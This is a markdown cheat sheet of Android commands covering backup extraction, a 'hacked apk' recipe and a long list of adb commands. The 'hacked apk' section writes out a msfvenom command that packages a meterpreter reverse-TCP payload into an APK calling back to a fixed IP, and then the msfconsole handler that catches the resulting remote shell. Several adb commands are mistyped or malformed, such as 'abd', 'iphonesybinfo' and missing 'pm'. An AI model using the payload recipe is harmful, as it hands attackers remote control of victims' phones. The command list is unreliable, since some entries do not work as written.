# Table of Contents
- [backup](#backup)
- [hacked apk](#hacked-apk)
- [adb commands](#adb-commands)

<br>
<br>

# backup
1) create backup file
```
adb backup -apk -shared -all -f ./backup.ab
```
2) decompress ab file
```
(printf "\x1f\x8b\x08\x00\x00\x00\x00\x00";tail -c +25 backup.ab) | tar xvzf -
```

<br>
<br>

# hacked apk
1) create hacked apk  
```
msfvenom -p android/meterpreter/reverse_tcp LHOST=10.100.102.33 LPORT=4444 R> /root/Desktop/trying.apk
```
then we do this
```
msfconsole 
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST <my_ip>
set LPORT <port>
exploit
```

<br>
<br>

# adb commands
1)show devices  
```
adb devices
```
2) open a shell  
```
adb shell
```
3) install app   
```
adb shell install <apk>
```
4) uninstall app  
```
adb shell uninstall <apk>
```
5) list directories   
```
adb shell ls
```
6) print size of each file  
```
adb shell ls -s
```
7) list recursive  
```
adb shell ls -R
```
8) copy file to the phone  
```
adb push <local> <remote>
```
9) copy file from the phone  
```
adb pull <remote> <local>
```
10) access the private package file  
```
run-as <package> cat <file>
```
11) print device state  
```
adb get-state
```
12) print device serial-number  
```
adb get-serialno
```
13) print device imei number  
```
adb shell dumpsys iphonesybinfo
```
14) list tcp  
```
adb shell netstat
```
15) print cwd  
```
abd shell pwd
```
16) list all services  
```
adb shell dumpsys -l
```
17) print battery status  
```
adb shell dumpsys battery
```
18) print phone features  
```
adb shell pm list features
```
19) list services  
```
adb shell service list
```
20) activity info  
```
adb shell dumpsys activity <package>/<activity>
```
21) print process info  
```
adb shell ps
```
22) display screen resolution  
```
adb shell wm size
```
23) print current apps opened activity  
```
dumpsys window windows|grep -E 'mCurrentFocus|mFocusedApp'
```
24) list packages  
```
adb shell list packages
```
25) list packages + path  
```
adb shell list packages -r
```
26) list info on all apps  
```
adb shell dumpsys package packages
```
27) list info on one package  
```
adb shell dump <name>
```
28) find path to apk  
```
adb shell path <package>
```
29) screenshot  
```
adb shell screencap -p <path>
```
30) record screen  
```
adb shell screenrecord <path>
```
31) backup settings apps and shared storage  
```
adb backup -apk -shared -all -f <path>
```
32) restore from backup  
```
adb restore <path>
```
33) open url  
```
adb shell am start -a android.intent.action.VIEW -d <url>
```
34) open gallery 
```
adb shell am start -t image/* -a android.intent.action.VIEW
```
35) view device log  
```
adb logcat
```
36) view device bug report  
```
adb bugreport
```
37) list permission groups  
```
adb shell permissions groups
```
38) list permission details  
```
adb shell list permissions -g -r 
```
39) see cpu and ram usage  
```
adb shell top
```
